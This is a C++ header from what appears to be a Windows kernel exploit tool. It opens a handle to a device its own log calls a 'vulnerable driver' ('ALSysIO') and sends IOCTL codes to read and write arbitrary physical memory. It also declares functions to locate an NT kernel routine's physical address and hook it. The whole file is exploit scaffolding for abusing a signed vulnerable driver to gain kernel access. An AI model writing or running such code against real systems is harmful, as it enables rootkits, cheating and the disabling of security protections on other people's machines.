#pragma once

#include <Windows.h>
#include <thread>
#include <optional>
#include <vector>
#include <array>

#include "../util.hpp"

namespace driver_util {

    namespace ctl_codes {
        constexpr auto read_ctl = 0x9C402618;
        constexpr auto write_ctl = 0x9C40261C;
    }

#pragma pack(push, 1)
    struct read_data {
        std::uint64_t physical_addr;
        std::uint32_t sz;
        char buf[0x100];
    };

    template< typename T >
    struct write_data {
        std::uint64_t physical_addr;
        std::uint32_t sz;
        T buf;
    };


#pragma pack(pop)
    struct driver {

        HANDLE drv_handle;

        driver() noexcept {
            util::log("%s", "Opening handle to vulnerable driver");
            do {
                this->drv_handle = CreateFileA("\\\\.\\ALSysIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                std::this_thread::sleep_for(std::chrono::seconds(1));
            } while (this->drv_handle == INVALID_HANDLE_VALUE);
            util::log("%s %p", "Driver handle:", this->drv_handle);
        }

        ~driver() noexcept {
            if (drv_handle)
                CloseHandle(drv_handle);
        }


        [[nodiscard]] char* read_phys_mem(std::uint64_t physical_addr, unsigned int num_bytes) const;

        template< typename T >
        bool write_phys_mem(std::uint64_t physical_addr, void* buf, std::size_t num_bytes)
        {
            write_data<T> wr_data{ physical_addr, num_bytes };
            std::memcpy(&wr_data.buf, buf, num_bytes);

            unsigned long bytes_returned{};
            const auto status = DeviceIoControl(drv_handle, ctl_codes::write_ctl, &wr_data, sizeof(wr_data), &wr_data, sizeof(wr_data), &bytes_returned, nullptr);
            if (!status)
                util::log("Failed to write physical memory via IOCTL. Error code:  %d", GetLastError());
            return status;
        }
    };

    struct phys_mem_range {
        std::size_t start;
        std::uint64_t length;
    };

    [[nodiscard]] std::optional<std::vector<phys_mem_range>> get_physmem_ranges();

    [[nodiscard]] std::size_t get_ntproc_phys_addr(const driver& drv, const char* module_name);

    void hook_ntproc(driver drv, std::uint64_t phys_addr);

}